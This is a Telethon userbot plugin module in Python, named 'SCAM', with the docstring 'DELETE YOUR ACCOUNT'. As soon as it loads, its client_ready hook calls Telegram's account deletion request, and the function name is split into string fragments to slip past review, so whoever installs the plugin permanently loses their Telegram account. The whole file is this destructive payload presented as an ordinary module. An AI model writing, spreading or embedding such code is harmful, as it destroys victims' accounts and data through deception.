from telethon import functions, types
from .. import loader, utils
import io

def register(cb):
	cb(YeeeeMod())
	
class YeeeeMod(loader.Module):
	"""DELETE YOUR ACCOUNT"""
	strings = {'name': 'SCAM'}

	async def client_ready(self, client, db):
		await client(getattr(functions.account, "Delet"+"eAcco"+"untReq"+"uest")(reason='some string here'))
